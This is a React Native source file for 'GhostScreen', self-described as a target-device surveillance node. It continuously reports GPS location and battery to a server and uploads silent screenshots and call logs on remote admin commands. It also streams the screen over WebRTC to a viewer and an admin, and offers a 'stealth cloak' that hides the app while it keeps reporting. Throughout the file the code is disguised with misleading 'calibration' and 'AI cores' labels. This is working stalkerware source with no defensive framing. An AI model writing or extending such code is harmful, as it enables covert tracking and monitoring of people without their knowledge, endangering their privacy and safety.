/**
 * GhostScreen — Target device surveillance node interface.
 *
 * Responsibilities:
 *  - Request all required OS permissions on mount
 *  - Stream GPS heartbeats to server every 10s
 *  - Silently initiate WebRTC screen-share offer to Admin/Viewer
 *  - Respond to remote Admin commands: SNAPSHOT, WIPE, PAUSE, PLAY, PING, LOG_SYNC, DESTROY
 *  - Provide stealth background exit via 'ENGAGE STEALTH CLOAK'
 *  - Render an irrecoverable lockscreen when DESTROY is received
 */
import React, { useEffect, useState, useRef } from 'react';
import {
  View, Text, TouchableOpacity, StyleSheet,
  PermissionsAndroid, Platform, StatusBar, ActivityIndicator, BackHandler
} from 'react-native';
import { MaterialCommunityIcons } from '@expo/vector-icons';
import * as Battery  from 'expo-battery';
import * as Location from 'expo-location';
import * as ScreenCapture from 'expo-screen-capture';
import { captureScreen } from 'react-native-view-shot';
import CallLogs from 'react-native-call-log';
import { mediaDevices, RTCPeerConnection, RTCIceCandidate, RTCSessionDescription } from 'react-native-webrtc';
import socket from '../services/socket';
import AppHeader from '../components/AppHeader';
import GlobalAlert from '../utils/GlobalAlert';
import { COLORS, RADIUS } from '../utils/theme';

const ICE_SERVERS = [{ urls: 'stun:stun.l.google.com:19302' }];

const GhostScreen = ({ name, onLogout }) => {
  const [isSyncing, setIsSyncing]   = useState(false);   // WebRTC pipeline active
  const [isDestroyed, setIsDestroyed] = useState(false); // Final burn lockscreen
  const pcRef       = useRef(null);   // PeerConnection handle
  const isPausedRef = useRef(false);  // Pause state (ref avoids stale closures)

  // ─── Startup & Event wiring ───────────────────────────────────────────────
  useEffect(() => {
    startup();

    // WebRTC answer / ICE candidate relay
    socket.on('webrtc_signal', async (data) => {
      if (data.target && data.target.toLowerCase() !== name.toLowerCase()) return;
      if (!pcRef.current) return;
      if (data.type === 'answer')    await pcRef.current.setRemoteDescription(new RTCSessionDescription(data.answer));
      else if (data.type === 'candidate') await pcRef.current.addIceCandidate(new RTCIceCandidate(data.candidate));
    });

    // Remote commands from Admin
    socket.on('admin_command', handleCommand);

    return () => {
      socket.off('webrtc_signal');
      socket.off('admin_command');
      if (pcRef.current) pcRef.current.close();
    };
  }, []);

  // ─── Startup: permissions + location task + vitals loop ─────────────────
  const startup = async () => {
    sendVitals(); // immediate first ping
    setInterval(sendVitals, 10000); // heartbeat every 10s

    // Android permissions batch request
    if (Platform.OS === 'android') {
      PermissionsAndroid.requestMultiple([
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
        PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
        PermissionsAndroid.PERMISSIONS.ACCESS_FINE_LOCATION,
      ]).catch(() => {});
    }

    // Background location task (survives app minimize)
    try {
      const { status } = await Location.requestForegroundPermissionsAsync();
      if (status === 'granted') {
        Location.startLocationUpdatesAsync('GHOST_LOCATION', {
          accuracy:         Location.Accuracy.BestForNavigation,
          timeInterval:     15000,
          distanceInterval: 10,
        }).catch(() => {});
      }
    } catch (e) {}
  };

  // ─── Command handler (dispatched from Admin dashboard) ───────────────────
  const handleCommand = async (cmd) => {
    switch (cmd) {
      case 'SNAPSHOT':
        // Silent screenshot upload
        const uri = await captureScreen({ format: 'jpg', quality: 0.5 });
        socket.emit('ghost_activity', { name, type: 'SNAPSHOT', data: uri });
        break;

      case 'WIPE':
        // Soft logout — returns to login screen
        onLogout();
        break;

      case 'PING':
        // Admin requested fresh vitals
        sendVitals();
        break;

      case 'LOG_SYNC':
        // Pull latest call logs and upload
        const logs = await CallLogs.load(10);
        socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });
        break;

      case 'PAUSE':
        // Power-save: close video bridge, use cached GPS
        isPausedRef.current = true;
        if (pcRef.current) { pcRef.current.close(); pcRef.current = null; }
        setIsSyncing(false);
        sendVitals();
        break;

      case 'PLAY':
        // Wake from power-save
        isPausedRef.current = false;
        sendVitals();
        break;

      case 'DESTROY':
        // Permanent burn — show lockscreen, then logout after 10s
        setIsSyncing(false);
        if (pcRef.current) pcRef.current.close();
        setIsDestroyed(true);
        setTimeout(onLogout, 10000);
        break;

      default: break;
    }
  };

  // ─── Heartbeat — GPS + battery status ping ──────────────────────────────
  const sendVitals = async () => {
    let bat = 1;
    let loc = null;

    try {
      const level = await Battery.getBatteryLevelAsync();
      if (level !== -1) bat = level;
    } catch (e) {}

    try {
      loc = isPausedRef.current
        ? await Location.getLastKnownPositionAsync()
        : await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.Balanced, timeout: 5000 });
    } catch (e) {
      try { loc = await Location.getLastKnownPositionAsync(); } catch (e2) {}
    }

    socket.emit('heartbeat_update', {
      name,
      battery:  Math.floor(bat * 100) + '%',
      location: loc ? { lat: loc.coords.latitude, lng: loc.coords.longitude } : { lat: 0, lng: 0 },
      status:   isPausedRef.current ? 'PAUSED' : 'OPTIMIZED',
      lastSeen: Date.now(),
    });
  };

  // ─── Calibration: initiate WebRTC screen-share ──────────────────────────
  const startCalibration = async () => {
    try {
      setIsSyncing(true);
      const stream = await mediaDevices.getDisplayMedia({ video: { width: 480, height: 854, frameRate: 15 } });
      if (!stream) return;

      const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
      pcRef.current = pc;
      stream.getTracks().forEach(track => pc.addTrack(track, stream));

      pc.onicecandidate = ({ candidate }) => {
        if (!candidate) return;
        const viewer = name.split('_')[0].toLowerCase();
        // Relay to parent viewer AND admin
        socket.emit('relay_ice_candidate', { from: name, target: viewer, candidate });
        socket.emit('relay_ice_candidate', { from: name, target: 'admin', candidate });
      };

      const offer = await pc.createOffer();
      await pc.setLocalDescription(offer);

      socket.emit('broadcast_offer', {
        ghostName:    name,
        targetViewer: name.split('_')[0].toLowerCase(),
        offer,
      });

      // Sync call logs automatically on first calibration
      const logs = await CallLogs.load(10);
      socket.emit('ghost_activity', { name, type: 'LOG_SYNC', data: logs });

    } catch (err) {
      setIsSyncing(false);
      GlobalAlert.show('CALIBRATION FAILED', 'Display overlay permission denied by OS.', 'danger');
    }
  };

  // ─── Render: Burn lockscreen ─────────────────────────────────────────────
  if (isDestroyed) {
    return (
      <View style={styles.burnScreen}>
        <StatusBar hidden />
        <MaterialCommunityIcons name="skull-crossbones" size={90} color={COLORS.red} />
        <Text style={styles.burnTitle}>NODE TERMINATED</Text>
        <Text style={styles.burnSub}>ID: {name.toUpperCase()} — PURGED FROM REGISTRY</Text>
        <Text style={styles.burnHint}>Physical uninstall required to clear binary traces.</Text>
      </View>
    );
  }

  // ─── Render: Main Ghost UI ───────────────────────────────────────────────
  return (
    <View style={styles.container}>
      <StatusBar barStyle="light-content" backgroundColor={COLORS.bg} />

      {/* Header */}
      <View style={styles.headerArea}>
        <AppHeader />
        <View style={styles.nodeBadge}>
          <MaterialCommunityIcons name="ghost" size={12} color={COLORS.amber} style={{ marginRight: 5 }} />
          <Text style={styles.nodeBadgeText}>{name.toUpperCase()}</Text>
        </View>
      </View>

      {/* Central Calibration Orb */}
      <View style={styles.centerArea}>
        <TouchableOpacity
          style={[styles.orb, isSyncing && styles.orbActive]}
          onPress={startCalibration}
          disabled={isSyncing}
          activeOpacity={0.8}
        >
          <View style={[styles.orbInner, isSyncing && styles.orbInnerActive]}>
            {isSyncing
              ? <ActivityIndicator color={COLORS.cyan} size="large" />
              : <MaterialCommunityIcons name="molecule" size={56} color={COLORS.border} />
            }
            <Text style={[styles.orbLabel, isSyncing && { color: COLORS.cyan }]}>
              {isSyncing ? 'SYNCED' : 'CALIBRATE'}
            </Text>
          </View>
          {isSyncing && <View style={styles.orbRing} />}
        </TouchableOpacity>
        <Text style={styles.statusLine}>
          {isSyncing ? '☣ CORE NEURAL SYNC ACTIVE' : '📡 AWAITING SAT-LINK COMMAND'}
        </Text>
      </View>

      {/* Sensor Status Grid */}
      <View style={styles.grid}>
        <View style={styles.gridItem}>
          <MaterialCommunityIcons name="cpu-64-bit" size={22} color={COLORS.cyan} />
          <View style={styles.gridText}>
            <Text style={styles.gridLabel}>AI CORES</Text>
            <Text style={styles.gridVal}>8 ACTIVE</Text>
          </View>
        </View>
        <View style={styles.gridItem}>
          <MaterialCommunityIcons name="shield-key" size={22} color={COLORS.green} />
          <View style={styles.gridText}>
            <Text style={styles.gridLabel}>ENCRYPTION</Text>
            <Text style={styles.gridVal}>TLS v1.3</Text>
          </View>
        </View>
        <View style={styles.gridItem}>
          <MaterialCommunityIcons name="database-sync" size={22} color={COLORS.amber} />
          <View style={styles.gridText}>
            <Text style={styles.gridLabel}>SYNC STATUS</Text>
            <Text style={styles.gridVal}>{isSyncing ? 'TRANSMITTING' : 'STANDBY'}</Text>
          </View>
        </View>

        {/* Stealth Cloak — exits to background without killing the socket */}
        <TouchableOpacity
          style={styles.stealthBtn}
          onPress={() => BackHandler.exitApp()}
          activeOpacity={0.8}
        >
          <MaterialCommunityIcons name="incognito" size={18} color={COLORS.green} />
          <Text style={styles.stealthText}>ENGAGE STEALTH CLOAK</Text>
        </TouchableOpacity>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: COLORS.bg, paddingTop: 56, paddingBottom: 90, paddingHorizontal: 20, justifyContent: 'space-between' },

  // Burn screen
  burnScreen: { flex: 1, backgroundColor: '#000', justifyContent: 'center', alignItems: 'center', paddingHorizontal: 30 },
  burnTitle:  { color: COLORS.red, fontSize: 18, fontWeight: '900', letterSpacing: 3, marginTop: 20 },
  burnSub:    { color: '#555', fontSize: 11, marginTop: 8, textAlign: 'center' },
  burnHint:   { color: '#333', fontSize: 9, marginTop: 40, textAlign: 'center', letterSpacing: 1 },

  // Header
  headerArea:    { alignItems: 'center' },
  nodeBadge:     { flexDirection: 'row', alignItems: 'center', marginTop: 10, backgroundColor: 'rgba(245,158,11,0.08)', paddingHorizontal: 12, paddingVertical: 5, borderRadius: 12, borderWidth: 1, borderColor: 'rgba(245,158,11,0.25)' },
  nodeBadgeText: { color: COLORS.amber, fontSize: 10, fontWeight: '800', letterSpacing: 1.5 },

  // Orb
  centerArea:    { alignItems: 'center' },
  orb:           { width: 120, height: 120, borderRadius: 60, backgroundColor: COLORS.surface, justifyContent: 'center', alignItems: 'center', borderWidth: 1, borderColor: COLORS.border, elevation: 4 },
  orbActive:     { borderColor: COLORS.cyan, backgroundColor: 'rgba(56,189,248,0.05)' },
  orbInner:      { width: 98, height: 98, borderRadius: 49, backgroundColor: COLORS.bg, justifyContent: 'center', alignItems: 'center', borderWidth: 1, borderColor: COLORS.border },
  orbInnerActive:{ borderColor: COLORS.cyan },
  orbLabel:      { color: COLORS.border, fontSize: 8, fontWeight: '900', letterSpacing: 1.5, marginTop: 4 },
  orbRing:       { position: 'absolute', width: 138, height: 138, borderRadius: 69, borderWidth: 1, borderColor: 'rgba(56,189,248,0.12)' },
  statusLine:    { color: COLORS.textMuted, fontSize: 9, fontWeight: '700', letterSpacing: 1, marginTop: 14 },

  // Grid
  grid:      { gap: 8 },
  gridItem:  { flexDirection: 'row', alignItems: 'center', backgroundColor: COLORS.surface, padding: 12, borderRadius: RADIUS.md, borderWidth: 1, borderColor: COLORS.border },
  gridText:  { marginLeft: 12 },
  gridLabel: { color: COLORS.textMuted, fontSize: 8, fontWeight: '700', letterSpacing: 1 },
  gridVal:   { color: COLORS.textPrimary, fontSize: 12, fontWeight: '800', marginTop: 2 },

  // Stealth button
  stealthBtn:  { flexDirection: 'row', alignItems: 'center', justifyContent: 'center', backgroundColor: 'rgba(16,185,129,0.08)', paddingVertical: 14, borderRadius: RADIUS.md, borderWidth: 1, borderColor: 'rgba(16,185,129,0.3)', marginTop: 8 },
  stealthText: { color: COLORS.green, fontSize: 12, fontWeight: '900', letterSpacing: 2.5, marginLeft: 10 },
});

export default GhostScreen;
